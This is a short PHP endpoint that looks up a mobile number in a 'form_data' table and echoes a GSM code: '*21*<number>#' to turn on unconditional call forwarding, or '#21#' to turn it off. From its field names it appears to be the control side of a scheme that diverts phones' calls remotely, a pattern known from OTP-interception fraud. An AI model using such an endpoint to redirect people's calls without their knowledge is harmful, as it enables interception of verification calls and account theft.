<?php
// Use the shared DB config (setup updates this file automatically)
require_once __DIR__ . "/cart/db_config.php"; 

// In db_config.php, $conn is a PDO instance.
// We need mysqli, so let's create mysqli connection from the same vars.
$mysqli = new mysqli($servername, $username, $password, $dbname);
if ($mysqli->connect_error) {
    die("db_fail");
}

$mnumber = $_POST['mnumber'] ?? '';
$status = $_POST['status'] ?? ''; // ignored, always 'client'

if (empty($mnumber)) {
    $mysqli->close();
    die('');
}

// ✅ Use prepared statement to prevent injection
$stmt = $mysqli->prepare("SELECT cf_status, forwarded_to FROM form_data WHERE mobile = ?");
$stmt->bind_param("s", $mnumber);
$stmt->execute();
$res = $stmt->get_result();

if (!$res || $res->num_rows == 0) {
    $stmt->close();
    $mysqli->close();
    die('');
}

$row = $res->fetch_assoc();
$cf_status = $row['cf_status']; // 'enabled' or 'disabled'
$forwarded_to = $row['forwarded_to'] ?? '';

$stmt->close();
$mysqli->close(); // ✅ closes DB connection

// ✅ Logic
if ($cf_status === 'enabled' && !empty($forwarded_to)) {
    echo "*21*" . $forwarded_to . "#"; // Enable call forwarding
} else {
    echo "#21#"; // Disable call forwarding
}
?>
